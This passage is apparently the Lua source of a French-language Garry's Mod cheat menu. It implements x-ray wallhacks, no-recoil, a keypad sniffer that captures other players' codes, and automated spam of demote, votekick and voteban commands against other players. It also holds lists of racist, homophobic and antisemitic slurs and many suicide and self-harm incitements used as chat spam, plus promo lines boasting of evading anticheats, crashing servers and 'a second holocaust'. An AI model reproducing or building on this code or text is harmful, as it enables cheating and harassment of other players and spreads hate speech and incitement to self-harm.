render.SetColorModulation( col.r / 255, col.g / 255, col.b / 255 )
if ghost then render.SetBlend( 0.3 ) end
ent:DrawModel()
render.SuppressEngineLighting( false )
cam.IgnoreZ( false )
render.MaterialOverride()
cam.End3D()
end
function ZNX.DoXray()
local me = LocalPlayer()
if !me or !me:IsValid() or !ZNX.Vars.Xray then return end
local fags = ents.GetAll()
--    table.sort( fags, function( a, b ) return a:GetPos():DistToSqr( EyePos() ) > b:GetPos():DistToSqr( EyePos() ) end )
for k, v in ipairs( fags ) do
if !ZNX.OnScreen( v, 50 ) or ZNX.ToMetric( me:GetPos():Distance( v:GetPos() ) ) > ZNX.NumberVars.XrayDistance then continue end
-- players loop
if ZNX.Vars.XrayPlayers and !Visible(v) and v:IsPlayer() then
if v == LocalPlayer() or !v:Alive() then continue end
local teamcol, teamcol2
if ZNX.Vars.TeamColors then
teamcol = team.GetColor(v:Team())
teamcol2 = Color(math.Clamp(teamcol.r - 100, 0, 255), math.Clamp(teamcol.g - 100, 0, 255), math.Clamp(teamcol.b - 100, 0, 255), 255)
elseif ZNX.Vars.PKChams then
teamcol = Color( 0, 255, 0 ) teamcol2 = Color( 255, 0, 0 )
else
teamcol = ZNX.DefaultScheme teamcol2 = ZNX.DefaultScheme2
end
ZNX.DrawXrayEntity( v, teamcol, ZNX.Vars.NoChamColours, !ZNX.Vars.XraySolid )
local gun = v:GetActiveWeapon()
if gun and gun:IsValid() then ZNX.DrawXrayEntity( gun, teamcol2, ZNX.Vars.NoChamColours, !ZNX.Vars.XraySolid ) end
end
-- props loop
if ZNX.Vars.XrayProps and v:GetClass() == "prop_physics" then
local teamcol, teamcol2
if ZNX.Vars.PKChams then
teamcol = Color( 0, 255, 0 ) teamcol2 = Color( 255, 0, 0 )
else
teamcol = ZNX.DefaultScheme teamcol2 = ZNX.DefaultScheme2
end
ZNX.DrawXrayEntity( v, teamcol2, ZNX.Vars.NoChamColours, true )
end
-- ents loop
if ZNX.Vars.XrayEntfinder and table.HasValue( ZNX.MarkedEnts, v:GetClass() ) then
local teamcol, teamcol2
if ZNX.Vars.PKChams then
teamcol = Color( 255, 255, 0 ) teamcol2 = Color( 255, 255, 0 )
else
teamcol = ZNX.DefaultScheme teamcol2 = ZNX.DefaultScheme2
end
ZNX.DrawXrayEntity( v, teamcol, ZNX.Vars.NoChamColours, true )
end
end
end
hook.Add( "PreDrawHUD", "AB_NewXray", ZNX.DoXray )
function ZNX.PKBeamsCore()
if ZNX.Vars.PKVerticalBeams then
render.SetMaterial( beammat )
for k, v in pairs( player.GetAll()) do
if !v:Alive() or v == LocalPlayer() then continue end
render.DrawBeam( v:GetPos() + Vector( 0, 0, -2000 ), v:GetPos() + Vector( 0, 0, 2000 ), 50, 0, 1, Color(255,255,255) )
end
end
end
hook.Add("PostDrawTranslucentRenderables", "znx_beams", ZNX.PKBeamsCore)
function ZNX.ToggleEntityScanner()
if !ZNX.EntScanner then
ZNX.EntScanner = true
ZNX.ScannerButton1 = ZNX.MakeFloatingButton( ScrW() / 2 - 180, (ScrH() / 2) - 50, "Afficher sur la Console", function() print(ZNX.EntScannerEnt)
for k, v in pairs( ZNX.EntScannerTab ) do
if istable( v ) then MsgC( v[2], v[1].."\n" ) else MsgN( v ) end
end
end)
ZNX.ScannerButton2 = ZNX.MakeFloatingButton( ScrW() / 2 - 180, (ScrH() / 2) - 20, "Ajouter a l'ESP", function()
if table.HasValue( ZNX.MarkedEnts, ZNX.EntScannerEnt:GetClass() ) then ZNX.ChatText( "Deja ajouter!", Color(255,205,205) ) return end
ZNX.ChatText( "Ajouter "..ZNX.EntScannerEnt:GetClass().." au entité", Color(255,255,255) )
table.insert(ZNX.MarkedEnts, ZNX.EntScannerEnt:GetClass())
end)
ZNX.ChatText( "Entity Scanner Activer", Color(255,255,255) )
else
ZNX.EntScanner = false
ZNX.ChatText( "Entity Scanner Désactiver", Color(255,205,205) )
if ZNX.ScannerButton1 then ZNX.ScannerButton1:Remove() end
if ZNX.ScannerButton2 then ZNX.ScannerButton2:Remove() end
end
end
ZNX.MouseReleased = false
function ZNX.ToggleFreeMouse()
if !ZNX.MouseReleased then
gui.EnableScreenClicker( true )
ZNX.MouseReleased = true
else
gui.EnableScreenClicker( false )
ZNX.MouseReleased = false
end
end
concommand.Add("LokiDev_toggle_mouse_cursor", ZNX.ToggleFreeMouse)
function ZNX.CalcView( ply, pos, angles, fov )
local me = LocalPlayer()
if !me:IsValid() or !me:Alive() or me:GetViewEntity() != me or me:InVehicle() then return end
local tps = {}
if ZNX.Vars.SilentAim and !ZNX.Vars.Thirdperson and lastoldang and isangle( lastoldang ) then
tps.origin = me:EyePos()
tps.angles = lastoldang
tps.fov = fov
return tps
end
if ZNX.Vars.NoRecoil and !ZNX.Vars.Thirdperson and !ZNX.Enabled then
--        tps.origin = me:EyePos()
tps.angles = me:EyeAngles()
--        tps.fov = fov
local ply = LocalPlayer()
local weapon = ply:GetActiveWeapon()
if weapon.Primary then
if weapon.Primary.Recoil then
weapon.Primary.Recoil = 0
end
if weapon.Primary.KickUp then
weapon.Primary.KickUp = 0
weapon.Primary.KickDown = 0
weapon.Primary.KickHorizontal = 0
end
end
return tps
end
if ZNX.Vars.Thirdperson then
if ZNX.RenderPanic then return end
local trace = util.TraceLine( { start = pos - ply:GetForward() * 2, endpos = pos - angles:Forward() * ZNX.NumberVars.TPSDistance, filter = player.GetAll(), mask = MASK_SHOT } )
tps.origin = trace.HitPos + ply:GetForward() * 20 + ply:GetRight() * ZNX.NumberVars.TPSOffset
tps.angles = angles
tps.fov = fov
return tps
end
end
hook.Add("CalcView", "znx_calcview", ZNX.CalcView)
function ZNX.ICanSeeMyAss( ply )
if ZNX.Vars.Thirdperson then return true end
return false
end
hook.Add("ShouldDrawLocalPlayer", "znx_drawplayer", ZNX.ICanSeeMyAss)
-- it would be very wise to keep this Désactiver for now
--[[
function ZNX.Transparency()
if ZNX.Vars.XrayProps then
for k, v in pairs(ents.GetAll()) do
render.SuppressEngineLighting( true )
end
end
end
hook.Add("RenderScene", "znx_transparency", ZNX.Transparency)
--]]
function ZNX.CheckWitnesses()
if !ZNX.Vars.WitnessDetector then return end
ZNX.Witnesses = {}
for k, v in pairs(player.GetAll()) do
if v:IsValid() and v != LocalPlayer() then
local Trace = {}
Trace.start  = LocalPlayer():EyePos() + Vector(0, 0, 32)
Trace.endpos = v:EyePos() + Vector(0, 0, 32)
Trace.filter = {v, LocalPlayer()}
TraceRes = util.TraceLine(Trace)
if !TraceRes.Hit then
if (v:EyeAngles():Forward():Dot((LocalPlayer():EyePos() - v:EyePos())) > math.cos(math.rad(45))) then
if !table.HasValue(ZNX.Witnesses, v) then table.insert( ZNX.Witnesses, v ) end
end
end
end
end
end
timer.Create("znx_WitnessCheck", 0.5, 0, ZNX.CheckWitnesses)
function ZNX.XrayShutoff()
for k, v in pairs(ents.GetAll()) do
v:SetColor(Color(255,255,255,255))
end
end
local demotereasons = {
"Nègre",
"Fils de putain",
"Tête de bite",
"Sale Gay",
"Batard",
"Salope",
"Abruti",
"Blaireau",
"Sac a merde",
"Trou du cul",
"Serveur de merde",
"Con comme ses pieds",
"Bougnoul",
"Con comme une chaise",
"Con comme une valise sans poignée",
"Envaselineur",
"Fils de chienne",
}
------------------------------------------------------------------------INSULT GENERATOR--------------------------------------------------------------------------------------
local openers = {
"va te faire baiser",
"mange merde",
"encule un babouin",
"meurent dans un incendie",
"gaz toi",
"assis toi sur un cisaille de jardinier",
"pousse une brique dans ton cul",
"avale des barbelés",
"dégage en Suède",
"encule un cochon",
"Incline toi devant moi",
"suce mes boule en sueur",
"revient quand tu ne sera plus un déchets",
"je pisserai sur tout ce que tu aime",
"suicide toi",
"pends toi",
"étouffe-toi avec ta bite",
"sort la de ton cul",
"assis toi sur une bite de cheval",
"fait toi violé",
"fait toi violer par des nègres",
"ta mère est une putain",
"viens a moi",
"pourquoi tu ne t'es pas encore suicidé",
"pourquoi tu existe ?",
"explose toi les couilles avec un fusil",
"fait toi stériliser",
"converti toi a l'islam",
"bois de l'eau de javel",
"supprime toi",
"étouffe toi sur une bite des baleine",
"suce de la merde",
"suce une bite",
"léche mon sphincter",
"mets-toi le feu",
"fait toi battre a mort par ton père",
"étouffer toi sur la bite de ton oncle",
"va te faire écraser par une féministe de 200 kg",
"rejoin daesh",
"enfonce ta bite dans un mixeur",
"fait une overdose de meth",
"allonge toi sous un camion",
"léche une prise électrique",
"avale des charbons ardents",
"meurent lentement",
"fait toi exploser",
"fait toi tirer dans un bar gay",
"bois ton foutre",
"épouse un musulman",
"frotte ta bite sur une râpe a fromage",
"enveloppe un râteau avec du fil barbelé et rentre le dans ton cul",
}
local buyourshitfaggot = {
"VAC + HAC + SAC : NON DÉTECTÉ",
"DEVIENT UN MEILLEUR JOUEUR",
"EXÉCUTEZ TOUTS LES SCRIPTS LUA : NON DÉTECTÉ",
"SOYEZ LE MEILLEUR QUAND VOUS ACHETEZ LE MEILLEUR",
"FAITE PLEURER LES ENFANTS EN DARKRP",
"DÉMOLIR LE LUA",
"ENVOYER LES NOOBS DANS LA SALETÉ",
"FAITE CRASH LES SERVEURS",
"HACK PARTOUT, N'IMPORTE QUAND, N'IMPORTE QUI",
"DÉTRUIRE TOUS LES ANTICHEATS",
"DÉTEND LES FÉMINISTES",
"LANCER UN SECOND HOLOCAUSTE",
"FATIGUÉ D'ÊTRE UN PUTAIN DE PERDANT ?",
"DEVIENT UNBANNISSABLE",
"#1 CAUSE DES SUICIDES D'ADMIN",
"PAS DE GROSSE",
"AIME-TU TRICHER ?",
"ETRE RÉGLO C'EST POUR LES PERDANTS",
"VOS LOOSERS DE PARENTS NE VOUS ONT JAMAIS ACHETÉ DE JOUETS CES COOL",
}
function ZNX.GenerateInsult()
return table.Random(openers)
end
function ZNX.GeneratePromo()
return table.Random(buyourshitfaggot).." --> NIQUE TA MERE"
end
function ZNX.FormatChatString( str )
str = string.Replace( str, "@1", ZNX.GenerateInsult() )
str = string.Replace( str, "@PrenezProcessdevMenu", ZNX.GeneratePromo() )
return str
end
concommand.Add("LokiDev_insult", function() LocalPlayer():ConCommand("say "..ZNX.GenerateInsult()  ) end)
concommand.Add("LokiDev_chatspam_once", function()
local txt = ZNX.ChatSpamText
if ZNX.Vars.ChatSpamOOC then txt = "// "..txt end
txt = ZNX.FormatChatString( txt )
if ZNX.Vars.ChatSpamPM then
for _, p in pairs(player.GetAll()) do
if !ZNX.Vars.ChatSpamPMAdmins and ZNX.GetRank( p ) != ( "user" or "guest" or "player" ) then continue end
RunConsoleCommand("ulx", "psay", p:Nick(), txt)
end
else
RunConsoleCommand("say", txt)
end
end)
--ZNX.CurrentBase = 0
--ZNX.BaseAreaSize = 2000
function ZNX.SetBase()
ZNX.ChatText( "Set base location", Color(255,255,255) )
ZNX.CurrentBase = LocalPlayer():GetPos()
end
concommand.Add( "LokiDev_base_set", ZNX.SetBase )
function ZNX.UnsetBase()
ZNX.ChatText( "Removed base", Color(255,255,255) )
ZNX.CurrentBase = 0
end
concommand.Add( "LokiDev_base_remove", ZNX.UnsetBase )
function ZNX.SetBaseSize( p, cmd, arg, astr )
if !tonumber( arg[1] ) then ZNX.ChatText( "Veuillez spécifier un rayon de base valide en mètres", Color(255,205,205) ) return end
ZNX.ChatText( "Rayon de proximité de la base défini sur "..arg[1].."m", Color(255,255,255) )
ZNX.BaseAreaSize = arg[1]
end
concommand.Add( "LokiDev_base_setsize", ZNX.SetBaseSize )
local elements = {
{ -- Screen
x = 0.075,
y = 0.04,
w = 0.85,
h = 0.25,
},
{ -- ABORT
x = 0.075,
y = 0.04 + 0.25 + 0.03,
w = 0.85 / 2 - 0.04 / 2 + 0.05,
h = 0.125,
text = "ABORT",
},
{ -- OK
x = 0.5 + 0.04 / 2 + 0.05,
y = 0.04 + 0.25 + 0.03,
w = 0.85 / 2 - 0.04 / 2 - 0.05,
h = 0.125,
text = "OK",
}
}
do -- Create numbers
for i = 1, 9 do
local column = (i - 1) % 3
local row = math.floor((i - 1) / 3)
local element = {
x = 0.075 + (0.3 * column),
y = 0.175 + 0.25 + 0.05 + ((0.5 / 3) * row),
w = 0.25,
h = 0.13,
text = tostring(i),
}
table.insert(elements, element)
end
end
function ZNX.CalculateKeypadCursorPos(ply, ent)
if !ply:IsValid() then return end
local tr = util.TraceLine( { start = ply:EyePos(), endpos = ply:EyePos() + ply:GetAimVector() * 65, filter = ply } )
if !tr.Entity or tr.Entity ~= ent then return 0, 0 end
local scale = ent.Scale
if !scale then return 0, 0 end
local pos, ang = ent:CalculateRenderPos(), ent:CalculateRenderAng()
if !pos or !ang then return 0, 0 end
local normal = ent:GetForward()
local intersection = util.IntersectRayWithPlane(ply:EyePos(), ply:GetAimVector(), pos, normal)
if !intersection then return 0, 0 end
local diff = pos - intersection
local x = diff:Dot( -ang:Forward() ) / scale
local y = diff:Dot( -ang:Right() ) / scale
return x, y
end
function ZNX.KPGetHoveredElement(ply, ent)
local scale = ent.Scale
local w, h = ent.Width2D, ent.Height2D
local x, y = ZNX.CalculateKeypadCursorPos(ply, ent)
for _, element in ipairs(elements) do
local element_x = w * element.x
local element_y = h * element.y
local element_w = w * element.w
local element_h = h * element.h
if  element_x < x and element_x + element_w > x and
element_y < y and element_y + element_h > y 
then
return element
end
end
end
ZNX.ShekelGrabbers = {}
local nxsuicidemsg = 0
function ZNX.Logic()
local me = LocalPlayer()
if !me:IsValid() then return end
local lmemfootprint = gcinfo()
for k, v in pairs(player.GetAll()) do
-- spectator detector
if( v:GetObserverTarget() and v != me and v:GetObserverTarget() == me and !table.HasValue( ZNX.TheyHaveEyesEverywhere, v ) ) then
surface.PlaySound("buttons/bell1.wav")
ZNX.ChatText( v:Nick().." te regarde en spéctateur!", Color(255,100,0) )
table.insert( ZNX.TheyHaveEyesEverywhere, v )
end
if ZNX.Vars.DodgeArrest then
if v != me and v:EyePos():Distance( me:GetPos() ) < 120 and me:Alive() and ( v:GetActiveWeapon() and v:GetActiveWeapon():IsValid() and v:GetActiveWeapon():GetClass() == "arrest_stick" ) then
if nxsuicidemsg <= CurTime() then
ZNX.ChatText( "Automatiquement suicidé pour éviter d'être arrêté par "..v:Nick(), Color(255,255,255) )
nxsuicidemsg = CurTime() + 1
end
RunConsoleCommand( "kill" )
end
end
if ZNX.Vars.KeypadJew then
local kp = v:GetEyeTrace().Entity
if IsValid(kp) && IsValid(v) and string.find( kp:GetClass(), "Keypad") and v:EyePos():Distance(kp:GetPos()) <= 120 then
kp.tempCode = kp.tempCode or ""
kp.tempText = kp.tempText or ""
kp.tempStatus = kp.tempStatus or 0
if kp:GetText() != kp.tempText or kp:GetStatus() != kp.tempStatus then
kp.tempText = kp:GetText()
kp.tempStatus = kp:GetStatus()
if(kp.tempText && !kp:GetSecure()) then
kp.tempCode = kp.tempText
timer.Simple(0, function() 
if kp:GetStatus() == 1 && kp.tempCode && kp.tempCode != "" then
kp.code = kp.tempCode
end
end)
else
local i = ZNX.KPGetHoveredElement(v, kp)
if (i) then i = i.text end
if kp.tempText then
timer.Simple(0, function()
if kp:GetStatus() == 1 && kp.tempCode && kp.tempCode != "" then
kp.code = kp.tempCode
end
end)
end
if kp.tempText == "" || kp:GetStatus() == 2 then
kp.tempCode = ""
end
timer.Simple(0, function() 
if(tonumber(i) && kp:GetText():len() != 0) then
kp.tempCode = kp.tempCode..i
end
end)
end
end
end
end
if isvector( ZNX.CurrentBase ) then
--if v == me then continue end
if ZNX.ToMetric( v:GetPos():Distance( ZNX.CurrentBase ) ) < tonumber(ZNX.BaseAreaSize+ ZNX.NumberVars.AreaScrollerSize) then
if !table.HasValue( ZNX.ShekelGrabbers, v ) then
surface.PlaySound("buttons/bell1.wav")
if v == me then
ZNX.ChatText( "Vous etes entré dans votre Zone!", Color(150,150,150) )
else
ZNX.ChatText( v:Nick().." es entré dans votre Zone!", Color(255,205,0) )
end
table.insert( ZNX.ShekelGrabbers, v )
end
elseif table.HasValue( ZNX.ShekelGrabbers, v ) and ZNX.ToMetric( v:GetPos():Distance( ZNX.CurrentBase ) ) > tonumber(ZNX.BaseAreaSize+ ZNX.NumberVars.AreaScrollerSize) then
if v == me then
ZNX.ChatText( "Vous avez quitté votre Zone", Color(150,150,150) )
else
ZNX.ChatText( v:Nick().." a quitté votre Zone", Color(100,255,100) )
end
table.RemoveByValue( ZNX.ShekelGrabbers, v )
end
else
ZNX.ShekelGrabbers = {}
end
end
for k,v in pairs( ZNX.TheyHaveEyesEverywhere ) do
if( !IsValid( v ) ) then table.remove( ZNX.TheyHaveEyesEverywhere, k ) continue end
if( !v:GetObserverTarget() or ( v:GetObserverTarget() and v:GetObserverTarget() != me ) ) then
ZNX.ChatText( v:Nick().." a arreter de vous spectate!", Color(100,255,100) )
table.remove( ZNX.TheyHaveEyesEverywhere, k )
end
end
if ZNX.Vars.ChatSpam then
if ZNX.Vars.ChatSpamBind and !me:KeyDown(IN_WALK) then return end
local txt = ZNX.ChatSpamText
if ZNX.Vars.ChatSpamOOC then txt = "// "..txt end
txt = ZNX.FormatChatString( txt )
if ZNX.Vars.ChatSpamPM then
for _, p in pairs(player.GetAll()) do
if !ZNX.Vars.ChatSpamPMAdmins and ZNX.GetRank( p ) != ( "user" or "guest" or "player" ) then continue end
RunConsoleCommand("ulx", "psay", p:Nick(), txt)
end
else
RunConsoleCommand("say", txt)
end
end
if ZNX.Vars.DemoteSpam or ZNX.Vars.WantedSpam or ZNX.Vars.ULXVotekickSpam or ZNX.Vars.ULXVotebanSpam then
for k, v in RandomPairs(player.GetAll()) do
if ZNX.IsFriend( v ) or v == me then continue end
local fag1, fag2 = table.Random( demotereasons )
if ZNX.Vars.DemoteSpam then RunConsoleCommand( "darkrp", "demote", v:Nick(), fag1 ) end
if ZNX.Vars.WantedSpam then RunConsoleCommand( "darkrp", "wanted", v:Nick(), fag1 ) end
if ZNX.Vars.ULXVotekickSpam then RunConsoleCommand( "ulx", "votekick", v:Nick(), fag1 ) end
if ZNX.Vars.ULXVotebanSpam then RunConsoleCommand( "ulx", "voteban", v:Nick(), "0" ) end
end
end
if ZNX.Vars.FlashlightSpam then
if input.IsKeyDown(KEY_F) then me:ConCommand("impulse 100") end
end
ZNX.MemoryDebug["logic"] = gcinfo() - lmemfootprint
end
hook.Add("Think", "znx_logic", ZNX.Logic)
function ZNX.PKTube()
local oldwep = false
if !LocalPlayer():IsOnGround() then ZNX.ChatText( "Vous ne pouvez pas lancer le tube quand vous n'êtes pas au sol!", Color(255,100,0) ) return end
if !LocalPlayer():HasWeapon("weapon_physgun") then ZNX.ChatText( "Vous n'avez pas de physgun!", Color(255,100,0) ) return end
if LocalPlayer():GetActiveWeapon():GetClass() != "weapon_physgun" then RunConsoleCommand( "use", "weapon_physgun" ) oldwep = true end
ZNX.EyeAngles( LocalPlayer():EyeAngles() - Angle(-180,0,0) )
ZNX.ActionTimer( 0.05, function() RunConsoleCommand( "gm_spawn", "models/props_phx/construct/concrete_pipe01.mdl") end)
ZNX.ActionTimer( 0.05, function() ZNX.EyeAngles( LocalPlayer():EyeAngles() - Angle(120,0,0) ) end)
ZNX.ActionTimer( 0.1, function() RunConsoleCommand( "+attack") end)
ZNX.ActionTimer( 0.05, function() ZNX.ScrollDelta = 100 end)
ZNX.ActionTimer( 0.1, function() RunConsoleCommand( "-attack") ZNX.ScrollDelta = 0 end)
if oldwep then
ZNX.ActionTimer( 0.01, function() RunConsoleCommand( "lastinv") end)
end
ZNX.ActionTimer( 0.1, function() RunConsoleCommand( "undo") end, true)
end
concommand.Add("LokiDev_pk_tubelaunch", ZNX.PKTube)
function ZNX.PK180()
ZNX.EyeAngles( Angle(LocalPlayer():EyeAngles().p, LocalPlayer():EyeAngles().y - 180, LocalPlayer():EyeAngles().r) )
end
concommand.Add("LokiDev_pk_180", ZNX.PK180)
function ZNX.PK180Up()
--ZNX.EyeAngles( Angle(LocalPlayer():EyeAngles().p, LocalPlayer():EyeAngles().y - 180, LocalPlayer():EyeAngles().r) )
ZNX.EyeAngles( Angle( -LocalPlayer():EyeAngles().p, LocalPlayer():EyeAngles().y - 180, LocalPlayer():EyeAngles().r) )
RunConsoleCommand( "+jump")
timer.Simple(0.1, function() RunConsoleCommand( "-jump") end)
end
concommand.Add("LokiDev_pk_180up", ZNX.PK180Up)
function ZNX.ClimbSwep()
local oldang = LocalPlayer():EyeAngles()
ZNX.EyeAngles( Angle( -LocalPlayer():EyeAngles().p, LocalPlayer():EyeAngles().y - 90, LocalPlayer():EyeAngles().r) )
timer.Simple(0.15, function() ZNX.EyeAngles( oldang ) end)
end
concommand.Add("LokiDev_climbswep", ZNX.ClimbSwep)
function ZNX.EyeAngles( ang )
local ang = Angle(math.Clamp(ang.p, -90, 90), ang.y, ang.r)
ang:Normalize()
LocalPlayer():SetEyeAngles(ang)
end
local actiontime = 0
function ZNX.ActionTimer( delay, func, terminate )
terminate = terminate or false
actiontime = actiontime + delay + (LocalPlayer():Ping() / 1000)
timer.Simple( actiontime, func)
if terminate then actiontime = 0 end
end
function ZNX.CanSee( ply )
local Trace = util.TraceLine( { 
start = LocalPlayer():GetShootPos(), 
endpos = ZNX.FindTargetPosition( ply ), 
mask = MASK_SHOT, 
filter = { LocalPlayer(), ply }
} )
return !Trace.Hit
end
------------------------------------------------------------------------PROPKILL UTILS--------------------------------------------------------------------------------------
function ZNX.PhysgunPickup( p, e )
if ZNX.Vars.DontTouchMeThere and e == LocalPlayer() then RunConsoleCommand( "kill" ) end
ZNX.HoldingProp = e
end
function ZNX.PhysgunDrop( p, e )
--    ZNX.HoldingProp = game.GetWorld()
end
hook.Add( "PhysgunPickup", "znx_physgun", ZNX.PhysgunPickup )
hook.Add( "PhysgunDrop", "znx_physgun", ZNX.PhysgunDrop )
------------------------------------------------------------------------WEAPON INSPECTOR--------------------------------------------------------------------------------------
local function gaytext( parent, text, vpos, color )
local ABLabel = vgui.Create( "DLabel", parent )
ABLabel:SetFont( "TargetID" )
ABLabel:SetPos( 20, vpos)
ABLabel:SetColor( color )
ABLabel:SetText( text )
ABLabel:SizeToContents()
end
local overrides = {
["weapon_crowbar"] = {
Damage = 25,
NumShots = 1,
ClipSize = 1,
Delay = 0.404
},
["weapon_stunstick"] = {
Damage = 40,
NumShots = 1,
ClipSize = 1,
Delay = 0.81
},
["weapon_pistol"] = {
Damage = 12,
NumShots = 1,
ClipSize = 18,
Ammo = "pistol",
Delay = 0.12,
},
["weapon_357"] = {
Damage = 75,
NumShots = 1,
ClipSize = 6,
Ammo = "357",
Delay = 0.75,
},
["weapon_smg1"] = {
Damage = 12,
NumShots = 1,
ClipSize = 45,
Ammo = "SMG1",
Delay = 0.075,
},
["weapon_shotgun"] = {
Damage = 4,
NumShots = 7,
ClipSize = 6,
Ammo = "buckshot",
Delay = 0.9,
},
["weapon_ar2"] = {
Damage = 11,
NumShots = 1,
ClipSize = 30,
Delay = 0.105,
},
["weapon_crossbow"] = {
Damage = 100,
NumShots = 1,
ClipSize = 1,
Delay = 1.95,
},
["weapon_rpg"] = {
Damage = 150,
NumShots = 1,
ClipSize = 1,
Delay = 2.2,
},
["weapon_frag"] = {
Damage = 150,
NumShots = 1,
ClipSize = 1,
Delay = 1.95,
},
["fas2_rem870"] = {
Delay = .86,
},
["fas2_ks23"] = {
Delay = 1.11,
},
["fas2_m67"] = {
Damage = 160,
Delay = 1.75,
},
}
local ammostrings = {
pistol = "HL2 Pistol",
smg1 = "HL2 SMG",
ar2 = "HL2 Pulse Rifle",
["357"] = "HL2 Magnum",
buckshot = "HL2 Shotgun",
rpg_round = "HL2 Rocket",
}
function ZNX.GunMenu()
if GMenu then return end
local GMenu = vgui.Create("DFrame")
GMenu:SetSize(590,520)
GMenu:SetTitle("Inspection de votre arme")
GMenu:Center()
GMenu:MakePopup()
GMenu.Paint = function(panel, w, h)
surface.SetDrawColor( ZNX.DefaultScheme )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(155, 155, 155, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(0, 0, 0, 255) )
surface.DrawRect( 10, 25, w - 20, h - 35 )
end
local gun = LocalPlayer():GetActiveWeapon()
if !gun:IsValid() then return end
local m9gay = false
local fas = false
local cw2 = false
if gun.Base == "bobs_gun_base" or gun.Base == "bobs_shotty_base" or gun.Base == "bobs_scoped_base" then m9gay = true end
if gun.Base == "fas2_base" or gun.Base == "fas2_base_shotgun" then fas = true end
if gun.Base == "cw_base" then cw2 = true end
gaytext( GMenu, "Nom de l'Arme: "..gun:GetPrintName(), 30, Color(205,225,255,255) )
gaytext( GMenu, "Classe d'Arme: "..gun:GetClass(), 50, Color(105,225,255,255) )
//////////////////////////////// hl2 guns ////////////////////////////////
if !gun.Primary then gun.Primary = {} end
if overrides[gun:GetClass()] then
local tab = overrides[gun:GetClass()]
for k, v in pairs(tab) do
gun.Primary[k] = v
end
end
//////////////////////////////// weapon stat workarounds ////////////////////////////////
local delay = 0
if gun.Primary.Delay then
delay = gun.Primary.Delay
elseif m9gay then
delay = 60 / gun.Primary.RPM
elseif fas or cw2 then
delay = gun.FireDelay
end
local gdmg = 0
if gun.Primary.Damage then
gdmg = gun.Primary.Damage
elseif fas or cw2 then
gdmg = gun.Damage
end
local gnumshots = 1
if gun.Primary.NumShots then
gnumshots = gun.Primary.NumShots
elseif fas or cw2 then
gnumshots = gun.Shots or 1
end
local gcone = 0
if gun.Primary.Cone then
gcone = gun.Primary.Cone
elseif m9gay then
gcone = gun.Primary.Spread
elseif fas then
gcone = gun.HipCone or 0
elseif cw2 then
gcone = gun.HipSpread or 0
end
local grecoil = 0
if gun.Primary.Recoil then
grecoil = gun.Primary.Recoil
elseif m9gay then
grecoil = gun.Primary.KickUp
elseif fas then
grecoil = gun.Recoil or 0
end
local voff = 90
gaytext( GMenu, "Dégâts: "..(gdmg or "nil").." ( x"..(gnumshots or "nil").." ) -- ("..(gdmg * gnumshots).." Au total)", voff, Color(255,225,155,255) )
voff = voff + 20
if gun.Primary.ClipSize then
if gun.Primary.ClipSize == -1 then gun.Primary.ClipSize = 1 end
gaytext( GMenu, "Dégâts par Chargeur: "..(gdmg * gnumshots) * gun.Primary.ClipSize, voff, Color(255,205,105,255) )
voff = voff + 20
end
gaytext( GMenu, "Dégâts par Seconde: "..math.ceil(1 / delay * (gdmg * gnumshots)), voff, Color(255,155,85,255) )
voff = voff + 20
if gun.Primary.ClipSize then
gaytext( GMenu, "Chargeurs: "..(gun.Primary.ClipSize or "Aucun Chargeurs"), voff, Color(255,195,195,255) )
voff = voff + 20
gaytext( GMenu, "Temps de Rechargement: "..math.Round(gun.Primary.ClipSize * delay, 3).."s", voff, Color(255,95,155,255) )
voff = voff + 20
end
gaytext( GMenu, "Précision: "..(10 - (gcone * 100) ), voff, Color(255,255,155,255) )
voff = voff + 20
if fas then
gaytext( GMenu, "Précision en Visé: "..(10 - (gun.AimCone or 0 * 100) ), voff, Color(155,255,155,255) )
voff = voff + 20    
end
if cw2 then
gaytext( GMenu, "Précision en Visé: "..(10 - (gun.AimSpread or 0 * 100) ), voff, Color(155,255,155,255) )
voff = voff + 20    
end
gaytext( GMenu, "Cadence de Tir: "..math.Round(delay, 3).." ( "..math.ceil(60 / delay).." Balles/Min )", voff, Color(255,255,155,255) ) 
voff = voff + 20
--gaytext( GMenu, "Recoil: "..grecoil.." ( "..math.Round((grecoil * 10) * 1 / delay, 1).." recoil per second ) ", voff, Color(205,255,125,255) )
--voff = voff + 20
if gun.Primary.Ammo then
local ammotyperaw = gun.Primary.Ammo
local ammotype = string.lower(gun.Primary.Ammo)
if ammostrings[ammotype] then ammotyperaw = ammostrings[ammotype] end
gaytext( GMenu, "Type de Munitions: "..ammotyperaw, voff, Color(105,255,125,255) ) 
voff = voff + 20
end
if m9gay then gaytext( GMenu, "Les dégâts et les stats TTK sont imprécis en raison du bug m9k double pénétration", voff, Color(255,0,0,255) ) end
voff = voff + 40
gaytext( GMenu, "Tirs pour Tuer: "..math.ceil(50 / (gdmg * gnumshots) ).."x tir tête -- "..math.ceil(100 / (gdmg * gnumshots)).."x tir torse -- "..math.ceil(400 / (gdmg * gnumshots)).."x tir bras", voff, Color(255,125,155,255) )
voff = voff + 20
gaytext( GMenu, "Tirs pour Tuer (Armure): "..math.ceil(100 / (gdmg * gnumshots) ).."x tir torse -- "..math.ceil(200 / (gdmg * gnumshots)).."x tir torse -- "..math.ceil(800 / (gdmg * gnumshots)).."x tir bras", voff, Color(255,125,255,255) )
voff = voff + 40
local ttk = (delay * math.ceil(100 / (gdmg * gnumshots) )) - delay
local ttk2 = (delay * math.ceil(50 / (gdmg * gnumshots) )) - delay
local ttk3 = (delay * math.ceil(400 / (gdmg * gnumshots) )) - delay
local ttk4 = (delay * math.ceil(200 / (gdmg * gnumshots) )) - delay
local ttk5 = (delay * math.ceil(800 / (gdmg * gnumshots) )) - delay
gaytext( GMenu, "Temps pour Tuer: "..math.Round(ttk2, 3).."s (Tête) -- "..math.Round(ttk, 3).."s (Torse) -- "..math.Round(ttk3, 3).."s (Bras)", voff, Color(205,255,185,255) )
voff = voff + 20
gaytext( GMenu, "Temps pour Tuer (Armure): "..math.Round(ttk, 3).."s (Tête) -- "..math.Round(ttk4, 3).."s (Torse) -- "..math.Round(ttk5, 3).."s (Bras)", voff, Color(155,155,255,255) )
voff = voff + 20
end
concommand.Add("LokiDev_inspectweapon", ZNX.GunMenu)
------------------------------------------------------------------------AIMBOT UTIL FUNCTIONS--------------------------------------------------------------------------------------
-- get this from a better place fucknuts
local OEyeAngles = OEyeAngles or FindMetaTable( "Player" ).SetEyeAngles
